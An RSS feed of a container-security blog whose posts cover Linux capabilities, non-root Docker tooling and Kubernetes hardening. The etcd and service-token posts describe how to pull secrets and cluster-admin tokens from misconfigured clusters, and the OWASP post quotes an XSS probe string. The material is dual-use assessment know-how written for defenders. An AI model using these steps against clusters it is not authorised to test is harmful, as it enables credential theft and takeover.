<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Linux Capabilities and when to drop all</title>
				<description>&lt;p&gt;Somewhat following on from my &lt;a href=&quot;https://raesene.github.io/blog/2017/07/23/network-tools-in-nonroot-docker-images/&quot;&gt;previous post&lt;/a&gt; about running containers in non-root environments I’ve been spending some more time reading up on Capabilities, so thought it would be worth making some notes.&lt;/p&gt;

&lt;h2 id=&quot;what-are-capabilities&quot;&gt;What are Capabilities?&lt;/h2&gt;

&lt;p&gt;Linux capabilities have been around in the kernel for some time.  The idea is to break up the monolithic root privilege that Linux systems have had, so that smaller more specific privileges can be provided where they’re required.  This helps reduce the risk that by compromising a single process on a host an attacker is able to fully compromise it.&lt;/p&gt;

&lt;p&gt;One point to make note of is, that capabilities are only needed to carry out privileged actions on a host.  If your process only needs to carry out actions that an ordinary user could without the use of sudo, su or setuid root binaries, then your process doesn’t need any capabilities assigned to it.&lt;/p&gt;

&lt;p&gt;To provide a concrete example, take the &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; program which ships with most Linux disitributions. Traditionally this program has been setuid root due to the fact that it needs to send raw network packets and this privilege is not availble to ordinary users.  With a capability aware system this can be broken down and only the CAP_NET_RAW privilege can be assigned to the file.  This means that an attacker who was able to compromise the ping binary, would only get a small additional level of privilege and not full access to the host, as might have been possible when it was setuid root.&lt;/p&gt;

&lt;h2 id=&quot;practical-use-of-capabilities&quot;&gt;Practical use of capabilities&lt;/h2&gt;

&lt;p&gt;So how do we actually manipulate capabilites on a Linux system? The most basic way of handing this (without writing custom code) is to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;setcap&lt;/code&gt; binaries which come with the libcap2-bin package on debian derived systems.&lt;/p&gt;

&lt;p&gt;If you use getcap on a file which has capabilities, you’ll see something like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/arping = cap_net_raw+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can see here that the arping file has cap_net_raw with &lt;code class=&quot;highlighter-rouge&quot;&gt;+ep&lt;/code&gt; at the end of it, so what does that mean.  The e here refers to the effective capability of the file and the p to the permitted capability. Effectively for file capabilities the effective flag is needed where the binary isn’t “capability aware” i.e. it’s not written with capabilities in mind (which is usually the case).  For practical purposes if you’re assigning capabilities to files, you’ll use &lt;code class=&quot;highlighter-rouge&quot;&gt;+ep&lt;/code&gt; most of the time.&lt;/p&gt;

&lt;p&gt;So if you want to assign a capability, for example to apply cap_net_raw to an nmap binary&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setcap cap_net_raw+ep /usr/bin/nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It’s important to note that you can’t set capabilities on symlinks, it has to be the binary, and also you can’t set capabilities on shell scripts (well unless you have a super-recent kernel)&lt;/p&gt;

&lt;h2 id=&quot;some-more-background---inheritable-and-bounded&quot;&gt;Some More background - Inheritable and Bounded&lt;/h2&gt;

&lt;p&gt;If you look at capability sets for files and processes, you’ll run across two additional terms which bear looking at, Inheritable and Bounded.&lt;/p&gt;

&lt;p&gt;Inheritable capabilites are capabilites that can be passed from one program to another.&lt;/p&gt;

&lt;p&gt;Bounded capabilities are, to quote the &lt;a href=&quot;https://linux.die.net/man/7/capabilities&quot;&gt;Man page for capabilities&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The capability bounding set acts as a limiting superset for the capabilities that a thread can add to its inheritable set using capset(2).
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;So they restrict which capabilities can be inherited by a process.&lt;/p&gt;

&lt;h2 id=&quot;back-to-the-practical---auditing-capabilities&quot;&gt;Back to the practical - Auditing capabilities&lt;/h2&gt;

&lt;p&gt;This is all well and good, but how do we audit capabilities?&lt;/p&gt;

&lt;p&gt;there’s a number of ways of reviewing what capabilities a process or file has got.  From a low-level perspective, we can review the contents of /proc/[pid]/status.  This will contain some information that looks like this :-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This set was for a user level process (using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /proc/self/status&lt;/code&gt;).  As you can see the CapPrm and CapEff are both all zero’s indicating that I don’t have any capabilities and assigned.&lt;/p&gt;

&lt;p&gt;If I then switch to a root user using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; and run the same command, I  get the following&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;which is quite the difference, here CapPrm and CapEff have a lot more content as I’m a privileged user.&lt;/p&gt;

&lt;p&gt;If we try the same in a Docker process using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run alpine:latest cat /proc/self/status&lt;/code&gt; we get&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which is quite different.  In this container we were running as root, so you might have guessed that we’d have the same permissions as we did in the root shell before. However as Docker limits the available default permissions we don’t get as much.&lt;/p&gt;

&lt;h3 id=&quot;interpreting-capabilities&quot;&gt;Interpreting capabilities&lt;/h3&gt;

&lt;p&gt;Of course these long hex strings aren’t exactly the most friendly way of viewing capabilities.  Luckily there are ways of making this a bit more readable.  if we use &lt;code class=&quot;highlighter-rouge&quot;&gt;capsh&lt;/code&gt; (which comes with libcap2-bin on debian derived systems) we can work out what’s meant here.&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;capsh --decode=0000003fffffffff&lt;/code&gt; returns&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;So that shows that our root shell run outside basically had all the capabilities.  If we run &lt;code class=&quot;highlighter-rouge&quot;&gt;capsh --decode=00000000a80425fb&lt;/code&gt; we can see what Docker provides by default&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which corresponds to the list in the &lt;a href=&quot;https://github.com/moby/moby/blob/master/oci/defaults.go#L14-L30&quot;&gt;source code&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;other-utilities&quot;&gt;Other Utilities&lt;/h3&gt;

&lt;p&gt;There are some other utilities which are handy for doing things like auditing capabilities.  the &lt;a href=&quot;https://people.redhat.com/sgrubb/libcap-ng/index.html&quot;&gt;libcap-ng-utils&lt;/a&gt; package has the very handy &lt;code class=&quot;highlighter-rouge&quot;&gt;filecap&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pscap&lt;/code&gt; programs which can be used to review capapbilties on all files and all processes on a system by default.  There’s also &lt;code class=&quot;highlighter-rouge&quot;&gt;captest&lt;/code&gt; which will review capabilities in the context of the current process.&lt;/p&gt;

&lt;p&gt;Also if you’re running containers and want a nice quick way to assess capabilities amongst other things, you could use Jessie Frazelle’s &lt;a href=&quot;https://github.com/jessfraz/amicontained&quot;&gt;amicontained&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;capabilities-and-containers&quot;&gt;Capabilities and Containers&lt;/h3&gt;

&lt;p&gt;So what has all this to do with Containers?  Well it’s worth noting what was mentioned early in this post which is, if you have a container which will run as a non-root user and which has no setuid or setgid root prgrams in it, you should be good to drop all capabilities.  This adds another layer of hardening to the container, which can be helpful in preventing container breakout issues.&lt;/p&gt;

&lt;p&gt;If you’re running with root containers, then it’s well worth reviewing the default list of capabilities that is provided by your container runtime an ensuring that you’re happy that these are needed.&lt;/p&gt;

&lt;p&gt;Specifically there are ones like CAP_NET_RAW in the default docker set which could be dangerous (see &lt;a href=&quot;https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers/&quot;&gt;here&lt;/a&gt; for more details)&lt;/p&gt;

&lt;h3 id=&quot;capability-gotchas&quot;&gt;Capability Gotcha’s&lt;/h3&gt;

&lt;p&gt;There are some gotcha’s to be aware of when using capabilities.  First up is that, to use file capabilities, the filesystem you’re running from needs to be capability aware.  A notable exception here is some versions of aufs that ship with some versions Debian and Ubuntu.  This can impact Docker installs, as they’ll use aufs by default.&lt;/p&gt;

&lt;p&gt;Another one is that where you’re manipulating files you need to make sure that the tools you’re using understand capabilities.  For example when backing up files with tar, you need to use the following switches to make it all work.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--xattrs               Enable extended attributes support
--xattrs-exclude=MASK  specify the exclude pattern for xattr keys
--xattrs-include=MASK  specify the include pattern for xattr keys
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In practice for tar you’ll likely want to use &lt;code class=&quot;highlighter-rouge&quot;&gt;--xattrs&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;--xatttrs-include=security.capability&lt;/code&gt; to make backups of files with capabilities.&lt;/p&gt;
</description>
				<pubDate>Sun, 27 Aug 2017 22:00:39 +0100</pubDate>
				<link>/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/</link>
				<guid isPermaLink="true">/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/</guid>
			</item>
		
			<item>
				<title>Network Tools in Non-Root Docker Images</title>
				<description>&lt;p&gt;As some environments which allow for Docker images to run (e.g. OpenShift Origin’s default setup) don’t allow containers to run as the root user, its worth knowing about other ways to get some networking and security tools run without having to have root.&lt;/p&gt;

&lt;p&gt;Usually tools like nmap, tcpdump and ping will either need to be setuid root or be run as a user who has root level privileges, however with a bit of capabilities fiddling its relatively easy to get a container that doesn’t need that level of privilege.&lt;/p&gt;

&lt;p&gt;The key is use use the &lt;code class=&quot;highlighter-rouge&quot;&gt;setcap&lt;/code&gt; utility to add the appropriate capability to your binaries, in this case CAP_NET_RAW.  CAP_NET_RAW is generally avaialable to containers as it’s on Docker’s default white list.&lt;/p&gt;

&lt;p&gt;Once you’ve downloaded packages into the image, just use something like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RUN setcap cap_net_raw+ep /usr/bin/nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;to set the capability on that binary.  One trick to note is that setcap doesn’t work on symbolic links so you need to find the destination of any links before using it.  One example is that in Alpine based images, &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/ping&lt;/code&gt; is just a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/busybox&lt;/code&gt; so if you want to enable CAP_NET_RAW in that setup &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/busybox&lt;/code&gt; should be your target.&lt;/p&gt;

&lt;p&gt;There’s an example repo and associated Docker Hub image &lt;a href=&quot;https://github.com/raesene/alpine-noroot-containertools&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-noroot-containertools/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
				<pubDate>Sun, 23 Jul 2017 13:15:39 +0100</pubDate>
				<link>/blog/2017/07/23/network-tools-in-nonroot-docker-images/</link>
				<guid isPermaLink="true">/blog/2017/07/23/network-tools-in-nonroot-docker-images/</guid>
			</item>
		
			<item>
				<title>Keeping your Docker builds fresh</title>
				<description>&lt;p&gt;Anyone who’s used images from Docker Hub will likely have noticed that there can be quite a few old and stale images up there.  People will post an image to help them achieve a goal but then might not remember to maintain it, which reduces the usefulness for others over time as software versions get outdated and projects that are incorporated into the image move on.  I’m guilty of this myself with quite a few images up on Hub that haven’t been updated since I initially uploaded them.&lt;/p&gt;

&lt;p&gt;Luckily, one of the handy things that you can do with Docker is to have automated builds on Docker Hub.  This lets you create images based on a Github repository and have Docker manage the build process for you, and with a bit of scripting you can automate the update process so that your images stay nice and fresh and ready for use.&lt;/p&gt;

&lt;p&gt;To get this working for your build, go into the “build settings” tab on the Docker Hub page and scroll down to “Build Triggers”. If you click the “Activate Triggers” button Docker Hub will helpfully provide you with a token and trigger URL which can trigger your image to be rebuilt, and will also provide example curl commands to trigger the build.&lt;/p&gt;

&lt;p&gt;So for example for one of my images the curl request to trigger a build on it would look like this (with the [TOKEN] replaced with the trigger token for the build)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -H &quot;Content-Type: application/json&quot; --data '{&quot;build&quot;: true}' -X POST https://registry.hub.docker.com/u/raesene/alpine-nettools/trigger/[TOKEN]/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now we have the method for updating our image, we just need to set up some mechanism for this to be carried out periodically.  The obvious way to do this is just to make use of a Linux host and cron but I’m sure there’s a variety of other ways of triggering an HTTP post on a regular basis.&lt;/p&gt;

&lt;p&gt;So just add your curl command to a crontab file somewhere and away you go.&lt;/p&gt;

&lt;p&gt;The last thing to watch for is obviously there’s a risk that your automated build will fail, so you should turn on the option in Docker Hub to notify you of any build failures.  That can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;Settings--&amp;gt;Notifications&lt;/code&gt;.  Just tick the box “Notify me when an automated build fails” and you should get an e-mail if something goes wrong.&lt;/p&gt;
</description>
				<pubDate>Sun, 09 Jul 2017 15:15:39 +0100</pubDate>
				<link>/blog/2017/07/09/Keeping-your-Docker-Builds-Fresh/</link>
				<guid isPermaLink="true">/blog/2017/07/09/Keeping-your-Docker-Builds-Fresh/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - etcd</title>
				<description>&lt;p&gt;&lt;a href=&quot;https://coreos.com/etcd&quot;&gt;etcd&lt;/a&gt; is a key element of most Kubernetes deployments as it stores the cluster state including items like service tokens, secrets and service configurations.&lt;/p&gt;

&lt;p&gt;So keeping access to this limited is pretty important for a secure cluster.  Depending on how your distribution of Kubernetes sets things up, there’s a number of different default configurations you might see.&lt;/p&gt;

&lt;p&gt;Some, like kubeadm, will bind etcd to the localhost interface only.  In this kind of setup an attacker would need to get access to the master node in order to get access to the API interface, so the exposure is somewhat limited.&lt;/p&gt;

&lt;p&gt;However the problem with localhost binding only is that it doesn’t really allow for clustered etcd setups.  If you want to have multiple etcd databases to allow some redundancy you need to allow for communications between datastores.&lt;/p&gt;

&lt;p&gt;In these cases port 2379/TCP and 2380/TCP are likely to be exposed on the network.  2379 is for client –&amp;gt; etcd communications, and 2380 is for communications between the different nodes in the etcd cluster.&lt;/p&gt;

&lt;p&gt;Its at this point that you’ll want to be well acquainted with the CoreOS guidelines on &lt;a href=&quot;https://coreos.com/etcd/docs/latest/op-guide/security.html&quot;&gt;etcd security&lt;/a&gt;.  This lays out the options that are available.  Basically etcd uses client certificate authentication, but there’s a couple of important points to note&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;There’s no checking of information in the certificate CN or SAN fields, so any valid certificate will allow access. So its probably worth using a dedicated certificate authority for the etcd cluster, and not using certificate issued by another CA (such as the one you’re using for general Kubernetes setup).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;With etcd and Kubernetes the setup is all or nothing, there’s no authorisation used, so be very careful with which clients are allowed access to the etcd datastore.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So say you’re reviewing a cluster and want to assess the etcd security posture, what’s the approach?&lt;/p&gt;

&lt;p&gt;You’ll likely need a copy of etcdctl to query the service.  Older versions can be queried with curl, but in newer Kubernetes installs, they’ve moved to gRPC and curl doesn’t work any more :(&lt;/p&gt;

&lt;p&gt;etcdctl can be acquired by downloading an etcd release like &lt;a href=&quot;https://github.com/coreos/etcd/releases/download/v3.1.5/etcd-v3.1.5-linux-amd64.tar.gz&quot;&gt;this one&lt;/a&gt; and getting it from the tarball.  Alternatively if you can deploy containers to the cluster, you could deploy something like &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools/&quot;&gt;this image&lt;/a&gt; which has it already installed.&lt;/p&gt;

&lt;p&gt;once you’ve got etcdctl installed, you can query the API with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;etcdctl --endpoint=http://[etcd_server_ip]:2379 ls&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you get back &lt;code class=&quot;highlighter-rouge&quot;&gt;/registry&lt;/code&gt; you’re likely dealing with a v2 install (Kubernetes 1.5 or lower) and you can easily wander through and explore the config.  In particular the &lt;code class=&quot;highlighter-rouge&quot;&gt;/registry/secrets/default&lt;/code&gt; path is likely to be of interest as it may contain the default service token which can provide elevated rights to the cluster.&lt;/p&gt;

&lt;p&gt;If you get back a blank line from the initial query its reasonably likely that you’ve got a v3 cluster and getting the data out is a bit different.&lt;/p&gt;

&lt;p&gt;First up you need to let etcdctl know that you’re dealing with v3, so &lt;code class=&quot;highlighter-rouge&quot;&gt;export ETCDCTL_API=3&lt;/code&gt; is needed.&lt;/p&gt;

&lt;p&gt;Once you’ve got that environment variable set, you should see a different set of etcdctl commands as being available, including &lt;code class=&quot;highlighter-rouge&quot;&gt;etcdctl snapshot save&lt;/code&gt; .  You can use this command to dump an instance of the etcd database to a file on disk.&lt;/p&gt;

&lt;p&gt;This database is in the boltdb format, so it’s possible to read the file using something like &lt;a href=&quot;https://github.com/br0xen/boltbrowser&quot;&gt;boltbrowser&lt;/a&gt;.  Unfortunately the format of the data will be a bit broken as it’s serialized in proto format (more details in &lt;a href=&quot;https://github.com/coreos/etcd/issues/7723&quot;&gt;this github issue&lt;/a&gt;), but you can likely still extract some useful information, if that’s your goal.&lt;/p&gt;

</description>
				<pubDate>Mon, 01 May 2017 15:15:39 +0100</pubDate>
				<link>/blog/2017/05/01/Kubernetes-Security-etcd/</link>
				<guid isPermaLink="true">/blog/2017/05/01/Kubernetes-Security-etcd/</guid>
			</item>
		
			<item>
				<title>Container Testing - A small tools container with SSH</title>
				<description>&lt;p&gt;When you’re doing security testing of container environments one of the things that can be pretty useful is having a container with useful tools connected to the container network.  From there you can run network scans of the container network and also test the scenario of “malicious container”&lt;/p&gt;

&lt;p&gt;There’s a couple of ways of achieving this goal. You could run a container interactively with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -i -t [image_name] /bin/sh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;but one of the downsides of using a container like this is if you exit from the container, it’ll stop running, so ideally you want a container that’ll keep running and that you can connect to over the network.&lt;/p&gt;

&lt;p&gt;One example of this approach is &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools/&quot;&gt;this image&lt;/a&gt; which has a couple of useful features.&lt;/p&gt;

&lt;p&gt;Its based on alpine linux so the image is nice and small, and it runs an SSH daemon so that it’ll stay running and you can just connect in with SSH (assuming that you have a root from the location you start from to the container)&lt;/p&gt;

&lt;p&gt;It also has a neat trick that I got from some &lt;a href=&quot;https://github.com/fedora-cloud/Fedora-Dockerfiles/blob/master/ssh/entrypoint.sh&quot;&gt;Fedora dockerfiles&lt;/a&gt; which is that it creates a random password each time you start an instance of the image.  This is a good thing (tm) as you don’t want a static password baked in to your image.&lt;/p&gt;

&lt;p&gt;To use this approach just do something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -d raesene/alpine-containertools&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then find out what IP address has been assigned to your container with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker inspect -f &quot;&quot; [container_name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and what the password that’s been generated with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker logs [container_name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and you should be able to SSH in and get started with testing.  This image has some network tools like nmap and curl and also some container tools like the docker client, kubectl and etcdctl which is handy for checking whether you can get access to the ETCD database in a Kubernetes network.&lt;/p&gt;
</description>
				<pubDate>Sat, 15 Apr 2017 13:35:39 +0100</pubDate>
				<link>/blog/2017/04/15/Container-Testing-small-tools-container/</link>
				<guid isPermaLink="true">/blog/2017/04/15/Container-Testing-small-tools-container/</guid>
			</item>
		
			<item>
				<title>Some thoughts on the new OWASP Top 10 - A7</title>
				<description>&lt;p&gt;The first release candidate of the new &lt;a href=&quot;https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%20-%202017%20RC1-English.pdf&quot;&gt;OWASP Top 10&lt;/a&gt; got released last week and one of the changes in particular seems to be generating a lot of comment, so I thought I’d chip in too with some thoughts.&lt;/p&gt;

&lt;p&gt;The title of this one is “Insufficient Attack Protection” and at core I think its about applications actively protecting themselves from attack, which I think is a great idea.&lt;/p&gt;

&lt;p&gt;What I don’t think it’s about, and it might benefit from some clarifications in this regard, is a requirement for all applications to use a WAF or RASP.&lt;/p&gt;

&lt;p&gt;So why do I like this idea?  Well if you think about almost every application kind of has some attack protection already, with account lockout policies.  The application sees something which isn’t right, a login with the wrong password, and after a pre-determined number of incorrect attempts, it takes an action, perhaps locking the account, perhaps asking for additional details, perhaps alerting an administrator (maybe even all three!).&lt;/p&gt;

&lt;p&gt;So the concept in general is already in use, but I think a lot of applications would benefit from extending it.  For example if a user says that their first name is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; that’s almost definitely not true! It’s a pretty clear indication that someone is trying to attack your application and you can make that attackers life harder by restricting their access or taking some other action, depending on the context.&lt;/p&gt;

&lt;p&gt;Another one could be if there’s a dropdown in your application with 5 possible values and the form is submitted with something that’s not in that list.  An ordinary user pretty much won’t ever do this, so it’s an indication that someone is either editing the HTML before submission, or using a proxy to intercept and modify the request, both reasonable indications (in most cases) that something untoward is happening.&lt;/p&gt;

&lt;p&gt;These are pretty simplistic examples but luckily there’s a really cool OWASP project that goes into a ton more detail, &lt;a href=&quot;https://www.owasp.org/index.php/OWASP_AppSensor_Project&quot;&gt;OWASP Appsensor&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This kind of action can make automated attacks much harder to execute and also can provide excellent alerting for blue teams to work with, and I think that’s a big win.  One key aspect of this is that the detection and response is embedded into the application.  One problem with external add-ons is that they can lack context about what is and is not expected behaviour in an application, that kind of context only really exists within the application itself.&lt;/p&gt;

&lt;p&gt;Predictably and quite justifiably there have been a lot of concerns and questions raised about this suggested change.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This will make Pentesters and Bug Bounty People’s lives harder&lt;/strong&gt; .  Yep that one’s true, but then as pentesters and bug bounty researchers are pseudo bad guys, isn’t that really a good thing? Flippancy aside, I think that applications with a lot of active defence need to have test environments where this is disabled specifically to allow for automated testing. Some testing would occur there, and then when the final product is ready to be tested, you can enable the protections and check that they’re working ok.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This is a mandate for WAF vendors&lt;/strong&gt; I really hope not.  Sure some applications won’t be able to retro-fit controls, and might want to use a WAF.  But two things on that, one there are open source WAFs available and two, when the security industry started pushing 2FA harder, I don’t recall anyone saying that “hey this is just a vendor pitch for RSA tokens” and if they had, I wouldn’t have agreed with them either :)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;There’s no statistical evidence that this is a problem&lt;/strong&gt; . I’m a bit torn on this one.  On the one hand that’s likely true and data based approaches are good.  On the other hand, how would you measure this?  No automated scanning tool is going to put “hey we didn’t get kicked out whilst testing” in their report is it?  I can only offer anecdotal evidence, that I only very very rarely see any kind of application active protection in play, so it’s definitely not commonly deployed.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This isn’t a vulnerability&lt;/strong&gt; .  Yep that’s true, but AFAICS this is a list of risks, not a list of vulnerabilities.  It may get used as a list of vulnerabilities, but on the title page it says risks :)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Anyway, there’s still lots of discussions to be had on this one and the rest of the changes, before this years Top10 is finalized, so it’ll be interesting to see how it all shakes out.&lt;/p&gt;
</description>
				<pubDate>Fri, 14 Apr 2017 17:05:39 +0100</pubDate>
				<link>/blog/2017/04/14/OWASP-Top-10-A7-Thoughts/</link>
				<guid isPermaLink="true">/blog/2017/04/14/OWASP-Top-10-A7-Thoughts/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - Service Tokens</title>
				<description>&lt;p&gt;Whilst spending some more time looking at Kubernetes, to help out with the forthcoming CIS Security standard, I was looking at cluster component authentication and noticed something that might not be known by everyone using Kubernetes, so I thought it’d be worth a post.&lt;/p&gt;

&lt;p&gt;When pods are deployed to a cluster, in most default installs, the &lt;a href=&quot;https://kubernetes.io/docs/admin/admission-controllers/&quot;&gt;Admission Contoller&lt;/a&gt; will run and take a set of pre-defined actions before the pods go live.  One of those actions is to mount a &lt;a href=&quot;https://kubernetes.io/docs/admin/service-accounts-admin/&quot;&gt;Service Account&lt;/a&gt; inside the containers that make up the pod.&lt;/p&gt;

&lt;p&gt;This service account includes a token which is mounted at a predictable location &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;What’s interesting is that, by default unless &lt;a href=&quot;https://kubernetes.io/docs/admin/authorization/rbac/&quot;&gt;RBAC&lt;/a&gt; is deployed, it’s likely that this token provides cluster admin privileges.&lt;/p&gt;

&lt;p&gt;This means that any attacker with access to a container can, fairly easily, get full access to the cluster API (in fact it’s kind of easier than the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kubelet exploit&lt;/a&gt; ).&lt;/p&gt;

&lt;p&gt;If you want to check this to see if it affects your cluster, just run a pod inside the cluster, attach to one of the containers, get a copy of &lt;a href=&quot;https://storage.googleapis.com/kubernetes-release/release/v1.6.0/bin/linux/amd64/kubectl&quot;&gt;kubectl&lt;/a&gt; and point it at your API Server with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl config set-cluster test --server=https://[API_SERVER_IP]:[API_SERVER_PORT]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then try out some kubernetes commands…&lt;/p&gt;

&lt;p&gt;Fortunately this issue has been addressed with Kubernetes 1.6 setups which make use of the default RBAC policy, so if you’re concerned about container breakout scenarios, I’d thoroughly recommend upgrading and making sure that you’re using a restrictive RBAC policy.&lt;/p&gt;

</description>
				<pubDate>Sun, 02 Apr 2017 18:05:39 +0100</pubDate>
				<link>/blog/2017/04/02/Kubernetes-Service-Tokens/</link>
				<guid isPermaLink="true">/blog/2017/04/02/Kubernetes-Service-Tokens/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - cAdvisor</title>
				<description>&lt;p&gt;So following on from my post about the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kube-exploit&lt;/a&gt;, I thought it would be interesting to look more at the attack surface of my sample Kubernetes cluster from the perspective of a Rogue container.  The setup follows the same path as the last post and I’m running from a kali linux container running on my cluster, to simulate an attacker who has compromised a single container on a cluster.&lt;/p&gt;

